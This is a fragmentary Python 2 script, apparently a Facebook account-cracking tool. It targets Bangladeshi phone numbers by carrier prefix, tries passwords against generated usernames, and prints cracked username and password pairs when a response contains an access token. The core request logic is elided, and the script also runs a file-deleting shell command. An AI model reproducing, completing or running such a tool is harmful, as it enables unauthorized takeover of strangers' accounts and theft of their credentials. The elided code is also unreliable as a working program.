import os, sys, time, lolcat, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : RIHAB AHMED'
    print 'FACEBOOK : MD RIHAB AHMED M.M'
    print 'GITHUB     : github.com/RxRihab'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    print '[2]  \x1b[1;92mRobi'
    print '[3]  \x1b[1;96mAirtel'
    print '[4]  \x1b[1;92mSkitto'
    print '[5]  \x1b[1;92mBanglalink'
    print '[6]  \x1b[1;93mTeletalk'
...
def action():
    ...
    if bch == '':
        ...
        print 50* '-'
        print ''
        print '130,131,132,133,134, 135,136,137,138,138,139'
        print ''
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;93m[Rihab-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[033[1;31m[Open After 05 Days]\x1b[0m \n'
